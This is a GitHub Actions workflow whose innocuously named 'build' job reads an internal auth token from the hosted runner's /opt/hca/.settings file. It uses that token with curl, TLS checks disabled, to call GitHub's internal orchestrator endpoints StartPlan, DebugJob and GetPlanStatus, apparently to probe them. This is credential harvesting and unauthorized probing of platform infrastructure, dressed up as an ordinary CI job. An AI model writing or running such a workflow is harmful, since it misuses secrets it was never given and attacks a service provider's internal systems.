name: Final Compare
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - run: |
          TOK=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'],end='')")
          BASE="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
          
          echo "=== GetPlanStatus (known to work) ==="
          curl -sk --http2 --connect-timeout 10 \
            -H "Authorization: Bearer $TOK" \
            -H "Content-Type: application/json" \
            -d '{}' \
            "${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1
          
          echo ""
          echo "=== StartPlan ==="
          curl -sk --http2 --connect-timeout 10 \
            -H "Authorization: Bearer $TOK" \
            -H "Content-Type: application/json" \
            -d '{}' \
            "${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/StartPlan" 2>&1
          
          echo ""
          echo "=== DebugJob ==="
          curl -sk --http2 --connect-timeout 10 \
            -H "Authorization: Bearer $TOK" \
            -H "Content-Type: application/json" \
            -d '{}' \
            "${BASE}/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob" 2>&1
